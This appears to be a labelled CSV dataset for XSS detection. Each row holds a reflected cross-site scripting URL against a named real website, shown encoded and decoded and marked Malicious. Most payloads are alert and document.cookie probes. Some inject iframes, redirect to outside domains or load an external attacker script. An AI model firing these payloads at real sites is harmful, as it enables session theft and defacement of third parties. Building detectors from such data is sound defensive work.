Payloads,Class,decoded,executed,parser_changed
http://www.cheater.de/search.php?words=%3c%2ftitle%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e<br>&amp;platform_name=pc&amp;submit=suche&amp;cmd=search,Malicious,"http://www.cheater.de/search.php?words=</title><script>alert(""xss"")</script>&platform_name=pc&submit=suche&cmd=search",True,True
http://www.bartsandthelondon.nhs.uk/research/search/search.asp?keywords=intellectua&amp;tv=1&quot;&gt;&lt;script&gt;al<br>ert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"http://www.bartsandthelondon.nhs.uk/research/search/search.asp?keywords=intellectua&tv=1""><script>alert(""bluemax"")</script>",True,True
http://www.virtualcancercentre.com/news.asp?search=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=search,Malicious,"http://www.virtualcancercentre.com/news.asp?search=""><script>alert(1)</script>&submit=search",True,True
http://www.makinabazaar.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious,"http://www.makinabazaar.com/forum/philboard_search.asp?searchterms=""><script>alert(document.cookie)</script><h1>www.raptr.us.tc</h1>",True,True
http://shires.cor.mlxchange.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;<br>hideresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3eale<br>rt('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3<br>c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/foroc<br>ibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.ht<br>ml%20%3c,Malicious,"http://shires.cor.mlxchange.com/middletier/errorpage.asp?fatal=0&severity=3&category=3&eventid=3201&hideresetbtn=0&hidedetails=1&msg=>""><title>norehem was here</title><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
http://geoliss.ekoplan.gov.rs/index.php?page=projekti/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;<br>src=&quot;http://yourjavascript.com/27544112151/xss.atmon3r.js&quot;&gt;&lt;/script&gt;,Malicious,"http://geoliss.ekoplan.gov.rs/index.php?page=projekti/""><script>alert('xss byatm0n3r')</script><script type=""text/javascript""src=""http://yourjavascript.com/27544112151/xss.atmon3r.js""></script>",True,True
http://ms147.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms147.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.evrensel.net/dunya.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious,"http://www.evrensel.net/dunya.php?txt_arsiv_tarihi=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>.com",True,True
http://www.privateproperty.co.za/search/prov.asp?listtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.privateproperty.co.za/search/prov.asp?listtype=""><script>alert(""maxwel"")</script>",True,True
http://www.politicalbase.com/index.php?obj=18&amp;searchtype=&amp;term=%22%3e%3cscript%3ealert%28%2fxss%2f%2<br>9%3c%2fscript%3e%3ca+foo%3d%22,Malicious,"http://www.politicalbase.com/index.php?obj=18&searchtype=&term=""><script>alert(/xss/)</script><a foo=""",True,True
http://freecybersearch.com/search.php?q=&lt;/title&gt;&lt;/head&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/html<br>&gt;,Malicious,http://freecybersearch.com/search.php?q=</title></head><script>alert(document.cookie)</script></html>,True,True
http://calendar.columbia.edu/sundial/webapi/get.php?viewtype=%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3c/script%3e,Malicious,"http://calendar.columbia.edu/sundial/webapi/get.php?viewtype=""><script>alert(document.cookie)</script>",True,True
http://ms162.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms162.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://guestbook.cpu.edu.ph/cpubook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://guestbook.cpu.edu.ph/cpubook/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.hotelastoria.cg.yu/index.php?jez=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.hotelastoria.cg.yu/index.php?jez=1""><script>alert(document.cookie)</script>",True,True
http://careers.computing.co.uk/careers/jobsearch/results?country=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://careers.computing.co.uk/careers/jobsearch/results?country=""><script>alert(""maxwel"")</script>",True,True
http://www.bigbizz.net/escada/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.bigbizz.net/escada/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://videoradius.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious,http://videoradius.com/signinform.php?msg=<script>alert(/xssed/)</script>,True,True
http://www.sailing.org/db/org/orgdisplay.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;met<br>a http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://www.sailing.org/db/org/orgdisplay.asp?title=<script>alert(""scriptorium(turkey)"")</script><meta http-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://www.abcdatos.com/cgi-bin/boletin.pl?seccion=programas&amp;email=&quot;&gt;&lt;script&gt;alert('whk')&lt;/script&gt;,Malicious,"http://www.abcdatos.com/cgi-bin/boletin.pl?seccion=programas&email=""><script>alert('whk')</script>",True,True
http://kurdistanonline.com/index.asp?p=search&amp;q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://kurdistanonline.com/index.asp?p=search&q=""><script>alert(document.cookie)</script>",True,True
http://www.pasificonline.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.pasificonline.com/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
"http://gasprices.mapquest.com/index.jsp?nogeoresults=true&amp;search=true&amp;latitude=&amp;longitude=&amp;address=&amp;<br>city=&amp;stateprovince=&amp;postalcode=%22%3e%3ciframe%20src=http://google.com%3e%3c/iframe%3e%3cscript%3ea<br>lert(document.cookie)%3c/script%3e&amp;gaspricetype=3,4,5&amp;brand=",Malicious,"http://gasprices.mapquest.com/index.jsp?nogeoresults=true&search=true&latitude=&longitude=&address=&city=&stateprovince=&postalcode=""><iframe src=http://google.com></iframe><script>alert(document.cookie)</script>&gaspricetype=3,4,5&brand=",True,True
http://www.goingout.ro/wp-content/plugins/comment-rating-pro/ck-processkarma.php?id=16039&amp;action=add<br>&amp;path=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.goingout.ro/wp-content/plugins/comment-rating-pro/ck-processkarma.php?id=16039&action=add&path=/""><script>alert(1)</script>",True,True
http://www2.fuse.tv/login.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www2.fuse.tv/login.php?ref=""></a><script>alert(document.cookie);</script>",True,True
http://www.regione.campania.it/portal/media-type/html/user/anon/page/searchresults.psml;jsessionid=1<br>97556bf32d4c6af560082df624c8185.tomcat1?offset=0&amp;recpage=12&amp;eventsubmit_dorefresh=trova&amp;query=%3cscr<br>ipt%3ealert%28%22xss%22%29%3c%2fscript%3e&amp;eventsubmit_dorefresh=trova,Malicious,"http://www.regione.campania.it/portal/media-type/html/user/anon/page/searchresults.psml;jsessionid=197556bf32d4c6af560082df624c8185.tomcat1?offset=0&recpage=12&eventsubmit_dorefresh=trova&query=<script>alert(""xss"")</script>&eventsubmit_dorefresh=trova",True,True
"http://sistemas.unq.edu.ar/mensajes/default.asp?to=ebonnier,ebonnier@psi.uba.ar,%20emanuelbonnier@ya<br>hoo.com.ar%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss<br>%20by%20xylitol%3c/h1%3e%3c/marquee%3e",Malicious,"http://sistemas.unq.edu.ar/mensajes/default.asp?to=ebonnier,ebonnier@psi.uba.ar, emanuelbonnier@yahoo.com.ar'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://animation.orange.fr/gps/video/video.php?video=4%22%3e%3cscript%3ealert%28/xss/.source%29%3c/s<br>cript%3e,Malicious,"http://animation.orange.fr/gps/video/video.php?video=4""><script>alert(/xss/.source)</script>",True,True
http://www.sonidoo.com/search.php?q=%3c%2ftitle%3e%3cscript%3ealert(666)%3c%2fscript%3e&amp;t=m&amp;button=b<br>uscar!,Malicious,http://www.sonidoo.com/search.php?q=</title><script>alert(666)</script>&t=m&button=buscar!,True,True
http://www.gonuldergahi.net/ekart/index.php?islem=hazirla&amp;adim=1&amp;kategori_id=6&amp;resimid=388&quot;&gt;&lt;script&gt;<br>alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.gonuldergahi.net/ekart/index.php?islem=hazirla&adim=1&kategori_id=6&resimid=388""><script>alert(document.cookie)</script>",True,True
http://help.travian.fr/index.php?type=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_nemesis/);alert<br>(document.cookie);%3c/script%3e,Malicious,"http://help.travian.fr/index.php?type=""></script><script>alert(/xssed_by_nemesis/);alert(document.cookie);</script>",True,True
http://seattle.mariners.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious,http://seattle.mariners.mlb.com/media/video.jsp?mid=<script>alert('pappy was here');</script>,True,True
http://87.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://87.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.zadkine.nl/smartsite25.html?cat=2&quot;&gt;&lt;script&gt;alert%20(/killer-tr/)&lt;/script&gt;&lt;h1&gt;killer-tr&lt;/h<br>1&gt;,Malicious,"http://www.zadkine.nl/smartsite25.html?cat=2""><script>alert (/killer-tr/)</script><h1>killer-tr</h1>",True,True
http://indicateurs.education.gouv.fr/resultlyceeg.php?code=&amp;annee=%22%3e%3cscript%3ealert(document.c<br>ookie)%3c/script%3e,Malicious,"http://indicateurs.education.gouv.fr/resultlyceeg.php?code=&annee=""><script>alert(document.cookie)</script>",True,True
http://www.mercadolibre.com.uy/uruguay/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious,"http://www.mercadolibre.com.uy/uruguay/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=�&as_pcia_id=>""><script>alert('xss');</script>",True,True
http://www.minpaku.ac.jp/seoul_seikatsu/index.jsp?header=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.minpaku.ac.jp/seoul_seikatsu/index.jsp?header=""><script>alert(""maxwel"")</script>",True,True
http://www.orlandorealtyinternational.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious,http://www.orlandorealtyinternational.com/?pg=asdf<script>alert(1337)</script>&frame=1,True,True
http://international.ucla.edu/africa/events/showevent.asp?eventid=5403&amp;eventdate=11/9/2006&quot;&gt;&lt;script&gt;<br>alert(/pyske/)&lt;/script&gt;,Malicious,"http://international.ucla.edu/africa/events/showevent.asp?eventid=5403&eventdate=11/9/2006""><script>alert(/pyske/)</script>",True,True
"http://dk.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",Malicious,"http://dk.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",True,True
http://wwws.house.gov/search97cgi/s97_cgi/index.jsp?querytext=&quot;&gt;&lt;script&gt;alert('x')&lt;/script&gt;,Malicious,"http://wwws.house.gov/search97cgi/s97_cgi/index.jsp?querytext=""><script>alert('x')</script>",True,True
http://wutzup.com/store/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://wutzup.com/store/gallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.eudora.com/cgi-bin/export.cgi?productid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/,Malicious,"http://www.eudora.com/cgi-bin/export.cgi?productid=""><script>alert(document.cookie)</script></",True,True
http://www.kumaribank.com/contents/checking-account.html&amp;id=17&quot;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious,"http://www.kumaribank.com/contents/checking-account.html&id=17""<script>alert(document.cookie)</script>",True,True
http://www.yi.org/reg.pl?sld=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.yi.org/reg.pl?sld=""><script>alert(document.cookie)</script>",True,True
http://siproquim.dpf.gov.br/spq/menu.jsp?op=%22%3e%3cscript%3ealert('xssed')%3c/script%3e,Malicious,"http://siproquim.dpf.gov.br/spq/menu.jsp?op=""><script>alert('xssed')</script>",True,True
http://shopping.aol.com/ppesearch/ppsearch?&amp;k=%22%3e%3cscript%3ealert(%2f%5c'the-sh0ck-b0y-www.rooti<br>ngforced.org%5c'%2f)%3c%2fscript%3e,Malicious,"http://shopping.aol.com/ppesearch/ppsearch?&k=""><script>alert(/\'the-sh0ck-b0y-www.rootingforced.org\'/)</script>",True,True
"<<script>alert(""xss"");//<</script>",Malicious,"<<script>alert(""xss"");//<</script>",True,True
http://oakland.athletics.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious,http://oakland.athletics.mlb.com/media/video.jsp?mid=<script>alert('pappy was here');</script>,True,True
http://uni17.ogame.de/game/redir.php?url=http://%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious,"http://uni17.ogame.de/game/redir.php?url=http://<""<<script>alert(document.cookie)</script>",True,True
http://videos.mmaweekly.com/search_results.php?search_phrase=%27%22%3e%3cscript%3ealert%28document.c<br>ookie%29%3b%3c%2fscript%3e&amp;category=,Malicious,"http://videos.mmaweekly.com/search_results.php?search_phrase='""><script>alert(document.cookie);</script>&category=",True,True
http://discussion.dreamhost.com/search.pl?cat=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://discussion.dreamhost.com/search.pl?cat=""><script>alert(""maxwel"")</script>",True,True
http://de.flyff.gpotato.eu/forum/common/aspx/errmsg.aspx?stype=db&amp;errno=1&amp;surl=%3c%22%3c%3cscript%3e<br>alert(1)%3c/script%3e,Malicious,"http://de.flyff.gpotato.eu/forum/common/aspx/errmsg.aspx?stype=db&errno=1&surl=<""<<script>alert(1)</script>",True,True
http://www.quoka.de/searchresult.cfm?search1=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;x%20y=&quot;,Malicious,"http://www.quoka.de/searchresult.cfm?search1=""><script>alert(document.cookie)</script><x y=""",True,True
http://drtr.test.cwfservice.net/proxy/store.esellerate.net/s.asp?s=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious,"http://drtr.test.cwfservice.net/proxy/store.esellerate.net/s.asp?s=""><script>alert(""maxwel"")</script>",True,True
http://www.tiaca.org/search.asp?gid=g8&amp;search.x=1&amp;search.y=1&amp;q=%3c/title%3e%3cscript%3ealert(%22foun<br>d%20by%20hotpockets%20of%20backslashsecurity.org%22)%3c/script%3e,Malicious,"http://www.tiaca.org/search.asp?gid=g8&search.x=1&search.y=1&q=</title><script>alert(""found by hotpockets of backslashsecurity.org"")</script>",True,True
http://wiki.horde.org/faq/user/general%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://wiki.horde.org/faq/user/general'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.nic.net.sg/cgi-bin/whois/whois.pl?dname=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,http://www.nic.net.sg/cgi-bin/whois/whois.pl?dname=<script>alert(document.cookie)</script>,True,True
http://www.rehber.gen.tr/adres/arama/%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.rehber.gen.tr/adres/arama/""><script>alert(document.cookie)</script>",True,True
http://www.freewareweb.com/coupons/?s=godaddy.com%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scr<br>ipt%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.freewareweb.com/coupons/?s=godaddy.com'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.poste.dz/ap/?page=%22%3e%3cscript%3ealert%28/mahboul-3lik/.source%29%3c/script%3e&lt;marquee<br>&gt;&lt;h1&gt;xss%20by%20samir-dz&lt;iframe%20%20src=index.php&gt;#,Malicious,"http://www.poste.dz/ap/?page=""><script>alert(/mahboul-3lik/.source)</script><marquee><h1>xss by samir-dz<iframe  src=index.php>#",True,True
http://the-closer-wiki.tnt.tv/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript%3e,Malicious,"http://the-closer-wiki.tnt.tv/account/><script>alert(""xss by azat"")</script>",True,True
http://apps.limewire.org/login.php?returnto=%22%3e%3ciframe%20src=http://google.com%3e%3c/iframe%3e%<br>3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"http://apps.limewire.org/login.php?returnto=""><iframe src=http://google.com></iframe><script>alert(document.cookie);</script>",True,True
http://bid4tackle.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://bid4tackle.com/search.php?min_cur=&mode=advanced&max_cur=&seller=include&seller_name=""><script>alert(document.cookie)</script>",True,True
http://www.britannica.com/bps/search?query=%3c/textarea%3e'%22%3e%3cscript%3ealert('naber%20nap%fdyo<br>n%20kerhaneci%20rapci%20:d')%3c/script%3e#search=tab~documents%2cterm~%3c%2ftextarea%3e'&amp;tab=active~<br>home%2citems~home%3e%2fbps%2fhome&amp;title=britannica%20online%20encyclopedia,Malicious,"http://www.britannica.com/bps/search?query=</textarea>'""><script>alert('naber nap�yon kerhaneci rapci :d')</script>#search=tab~documents,term~</textarea>'&tab=active~home,items~home>/bps/home&title=britannica online encyclopedia",True,True
http://www.colt.net/de/ge;internal&amp;action=search.action?searchstring=%22%3e%3cscript%3ealert(1);%3c/<br>script%3e,Malicious,"http://www.colt.net/de/ge;internal&action=search.action?searchstring=""><script>alert(1);</script>",True,True
http://www.netstumbler.org/f55/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.netstumbler.org/f55/?threadprefix=""><script>alert(document.cookie);</script>",True,True
http://qur-an.tv/pop_sura_recommend.php?kid=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://qur-an.tv/pop_sura_recommend.php?kid=</textarea>'""><script>alert(document.cookie)</script>",True,True
http://www.come2sense.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.come2sense.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
